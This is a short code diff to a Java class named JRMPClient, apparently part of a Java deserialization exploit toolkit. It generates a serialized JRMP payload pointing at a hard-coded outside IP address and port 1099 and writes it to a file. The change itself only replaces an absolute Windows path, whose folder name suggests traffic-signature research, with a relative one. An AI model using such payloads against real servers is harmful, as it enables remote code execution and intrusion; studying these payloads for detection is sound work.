@@ -30,7 +30,7 @@ public class JRMPClient {
     @SneakyThrows
     public static void main(String[] args){
         Object payload = getPayload("49.234.105.98", 1099);
-        FileOutputStream fileOutputStream = new FileOutputStream(new File("C:\\Users\\18148\\Desktop\\tmp\\流量特征\\JRMP"));
+        FileOutputStream fileOutputStream = new FileOutputStream(new File("JRMP"));
         ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
         objectOutputStream.writeObject(payload);
         fileOutputStream.close();
